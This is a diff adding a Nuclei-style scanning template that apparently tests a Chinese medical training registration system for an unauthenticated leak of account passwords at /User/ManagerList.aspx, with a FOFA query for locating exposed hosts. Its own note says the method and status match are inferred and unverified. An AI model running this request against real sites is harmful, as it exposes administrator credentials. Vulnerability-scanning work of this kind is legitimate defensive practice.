@@ -1,0 +1,23 @@
+id: poc-1650dd987d16b91c4147
+info:
+  name: 远秋医学培训报名系统v1.0ManagerList存在未授权账号密码泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1650dd987d16b91c4147309d8f107148
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 1650dd987d16b91c4147309d8f107148
+    fofa: title="远秋医学培训报名系统v1.0"
+http:
+- raw:
+  - 'GET /User/ManagerList.aspx?ty=1&ty=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
